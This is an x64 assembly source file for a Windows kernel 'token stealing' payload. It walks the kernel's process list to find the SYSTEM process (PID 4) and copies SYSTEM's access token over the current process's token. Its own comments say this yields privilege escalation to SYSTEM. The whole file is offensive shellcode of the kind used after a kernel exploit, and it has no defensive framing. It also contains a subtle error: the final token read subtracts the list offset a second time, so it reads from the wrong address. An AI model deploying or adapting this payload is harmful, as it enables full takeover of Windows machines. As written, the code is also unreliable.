.code

;;
;; Offsets for:
;; Microsoft (R) Windows Debugger Version 10.0.27829.1001 AMD64
;;

;; _KTHREAD+0x220    Process            : Ptr64 _KPROCESS
OFFSET_KTHREAD_PROCESS                  EQU 220h

;; _EPROCESS+0x440   UniqueProcessId    : Ptr64 Void
OFFSET_EPROCESS_PID                     EQU 440h

;; _EPROCESS+0x448   ActiveProcessLinks : _LIST_ENTRY
;; _LIST_ENTRY+0x000 Flink              : Ptr64 _LIST_ENTRY
OFFSET_EPROCESS_ACTIVE_PROCESS_LINKS    EQU 448h
OFFSET_PID_REL_TO_ACTIVE_PROCESS_LINKS  EQU -8h

;; _EPROCESS+0x4b8 Token            : _EX_FAST_REF
OFFSET_EPROCESS_TOKEN                   EQU 4B8h
;;

TokenStealWin64_10 PROC
    ;; 
    ;; Gets the current _KTHREAD from KPCR
    ;; Walks the KTHREAD->Process->ActiveProcessLinks linked list
    ;; When it finds PID 4 (SYSTEM), copies the token
    ;; & finally replaces the current processes token with that token
    ;; This leads to EOP to SYSTEM
    ;;

    ; Save volatile registers
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi

    ; Get _KTHREAD from KPCR
    mov rax, gs:[188h]                     ; Get _KTHREAD of current thread 
    mov rbx, [rax+OFFSET_KTHREAD_PROCESS]  ; Get _KTHREAD->Process (current process)         
    mov rax, rbx                           ; Save current _EPROCESS in rax

SearchSystemPid:
    mov rcx, [rbx+OFFSET_EPROCESS_ACTIVE_PROCESS_LINKS]      ; Get _EPROCESS->ActiveProcessLinks->Flink
    sub rcx, OFFSET_EPROCESS_ACTIVE_PROCESS_LINKS            ; Convert Flink to EPROCESS pointer
    mov rbx, rcx                                             ; Update rbx to point to next process
    mov rdx, [rbx+OFFSET_EPROCESS_PID]                       ; Get PID of next process
    cmp rdx, 4                                               ; Check if it is the SYSTEM process
    jnz SearchSystemPid  

    mov rbx, [rcx-OFFSET_EPROCESS_ACTIVE_PROCESS_LINKS+OFFSET_EPROCESS_TOKEN]  ; Save token of SYSTEM process
    mov [rax+OFFSET_EPROCESS_TOKEN], rbx                                       ; replace current token with SYSTEM token

    ; Restore registers
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax

    ret

TokenStealWin64_10 ENDP

END